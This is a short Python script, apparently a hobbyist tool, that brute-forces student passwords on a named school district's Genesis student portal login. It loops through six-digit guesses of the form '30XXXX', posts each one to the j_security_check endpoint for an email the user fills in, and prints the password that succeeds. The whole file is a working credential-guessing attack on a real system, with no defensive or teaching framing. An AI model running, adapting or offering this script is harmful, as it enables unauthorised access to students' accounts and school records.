import requests # Import needed module

url = 'https://parents.genesisedu.com/bernardsboe/sis/j_security_check' # define api uri
email = '' # Put student Email here (ex: example@bernardsboe.com)
print(f'[*] Starting Crack for {email}') # Print email to crack

for i in range(9999): # Loop through possible passwords
    toTry = f'30{str(i).zfill(4)}' # Create password to try (ex: 300736)
    print(f'[*] Trying [{toTry}]') # print what password is being tried
    try:
        ses = requests.Session()
        ses.max_redirects = 2
        # put the username and password into a object ready to be send to the api
        dataToSend={"j_password": toTry, "j_username": email}
        # Send data to genesis api as if you clicked login on the login form
        data = ses.post(url, timeout=0.5, data=dataToSend)
        # try the next possible password if server timeouts or has too many redirects
    except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
        continue
    if data.status_code != 200:
        continue
    print(f'\n[*] Complete: {toTry}') # if passwords is correct print it
    break # Exit the loop when the password has been found